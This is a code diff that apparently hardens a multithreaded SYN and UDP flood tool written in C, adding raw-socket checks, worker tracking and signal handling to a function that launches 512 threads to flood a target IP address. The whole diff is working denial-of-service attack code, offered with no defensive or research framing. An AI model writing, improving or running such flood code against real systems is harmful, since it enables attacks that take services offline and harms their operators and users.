@@ -15,6 +15,7 @@
 #include <netinet/tcp.h>
 #include <netinet/in.h>
 #include <signal.h>
+#include <stdatomic.h>
 #include <netinet/udp.h>  // struct udphdr
 
 #include "nero/ascii.h"
@@ -31,6 +32,11 @@ int port_select;
 extern pthread_mutex_t ekran_mutex;
 
 volatile sig_atomic_t stop_flag = 0;
+
+/* Number of flood workers still alive.  When the last worker exits (for
+ * example because raw sockets could not be opened) the animation thread is
+ * released instead of spinning forever. */
+static atomic_int active_workers = 0;
 
 pthread_t threads[THREAD_COUNT];
 pthread_t animasyon_thread;
@@ -195,10 +201,20 @@ int is_target_online(const char *ip) {
     return (status == 0);
 }
 
+/* Runs when a worker exits, whether normally or through pthread_exit(). */
+static void flood_worker_cleanup(void *unused)
+{
+    (void)unused;
+    if (atomic_fetch_sub_explicit(&active_workers, 1, memory_order_relaxed) == 1)
+        stop_flag = 1;
+}
+
 // Thread function: continuously send SYN + UDP packets to target IP
 static void *flood(void *arg)
 {
     const char *target_ip = (const char *)arg;
+    atomic_fetch_add_explicit(&active_workers, 1, memory_order_relaxed);
+    pthread_cleanup_push(flood_worker_cleanup, NULL);
     /* Per-thread PRNG state.  time(NULL) tek başına yeterli değil: aynı
      * saniyede başlayan thread'ler aynı seed'i alır.  pthread_self() ve
      * stack adresi karıştırarak thread'leri ayır. */
@@ -412,7 +428,8 @@ static void *flood(void *arg)
 
     close(sock_tcp);
     close(sock_udp);
-    pthread_exit(NULL);
+    pthread_cleanup_pop(1);
+    return NULL;
 }
 
 void *flood_animation(void *arg)
@@ -473,9 +490,25 @@ int port_get(const char *target_ip){
     return 0;
 }
 
+/* Verify that a raw IPv4 socket can be created before spawning 512 workers.
+ * Without this probe a permission failure (missing root/CAP_NET_RAW) would
+ * leave every worker exiting immediately while the animation thread keeps the
+ * caller blocked. */
+static int raw_sockets_available(void)
+{
+    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+    if (fd < 0) return 0;
+    close(fd);
+    fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
+    if (fd < 0) return 0;
+    close(fd);
+    return 1;
+}
+
 // Starts THREAD_COUNT threads to flood the provided target IP
 int SYN_Flood(const char *target_ip) {
     stop_flag = 0;
+    atomic_init(&active_workers, 0);
 
     /* 512 threads x 2 raw sockets = 1024 fds; default RLIMIT_NOFILE is
      * usually 1024 and would silently fail late threads. */
@@ -501,6 +534,13 @@ int SYN_Flood(const char *target_ip) {
     }
 #endif
 
+    if (!raw_sockets_available()) {
+        fprintf(stderr,
+                "\n\033[49m[!]\033[0m\033[1;31m Cannot open raw IPv4 sockets; "
+                "root or CAP_NET_RAW is required.\033[0m\n");
+        return 1;
+    }
+
     if (port_get(target_ip) != 0)
         return 1;
 
@@ -519,7 +559,8 @@ int SYN_Flood(const char *target_ip) {
                 target_ip);
     }
 
-    if (sigaction(SIGINT, &sa, NULL) == -1) {
+    struct sigaction previous_sa;
+    if (sigaction(SIGINT, &sa, &previous_sa) == -1) {
         perror("sigaction");
         return 1;
     }
@@ -528,6 +569,7 @@ int SYN_Flood(const char *target_ip) {
 
     if (pthread_create(&animasyon_thread, NULL, flood_animation, (void *)target_ip) != 0) {
         fprintf(stderr, "Failed to create animation thread\n");
+        sigaction(SIGINT, &previous_sa, NULL);
         return 1;
     }
 
@@ -540,9 +582,12 @@ int SYN_Flood(const char *target_ip) {
         threads_created++;
     }
 
+    if (threads_created == 0)
+        stop_flag = 1;
     for (int i = 0; i < threads_created; i++)
         pthread_join(threads[i], NULL);
     pthread_join(animasyon_thread, NULL);
+    sigaction(SIGINT, &previous_sa, NULL);
     printf("[-]Thread\n");
 
     if (threads_created != THREAD_COUNT) {
